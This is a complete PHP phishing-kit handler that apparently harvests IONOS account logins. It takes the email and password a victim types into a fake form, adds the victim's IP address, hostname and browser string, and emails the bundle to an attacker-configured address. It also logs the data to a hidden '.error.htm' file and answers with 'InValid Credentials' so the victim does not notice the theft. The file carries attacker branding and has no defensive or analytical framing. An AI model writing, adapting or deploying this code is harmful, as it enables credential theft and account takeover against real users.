<?php
include 'email.php';
$email = trim($_POST['ai']);
$password = trim($_POST['pr']);

if($email != null && $password != null){
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|------------| ABILITY-ABLE GOD |--------------|\n";
	
	$message .= "Online ID : ".$email."\n";
	$message .= "Pass  ID : ".$password."\n";
	$message .= "|--------------- I N F O | I P ----------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|------------ Fixed By ABILITY ABLE GOD-----------|\n";
	$sender = "From: Ability-3D|#Anonymous<Medility3@gmail.com>";
	$send = $Receive_email;
	$subject = "ionos : Logs";
    	mail($send, $subject, $message, $sender); 

    	$data = "\n".$message;
	$fp = fopen('.error.htm', 'a');
	fwrite($fp, $data);
	fclose($fp); 


	$signal = 'ok';
	$msg = 'InValid Credentials';
	
	// $praga=rand();
	// $praga=md5($praga);
}
else{
	$signal = 'bad';
	$msg = 'Please fill in all the fields.';
}
$data = array(
        'signal' => $signal,
        'msg' => $msg,
        'redirect_link' => $redirect,
    );
    echo json_encode($data);

?>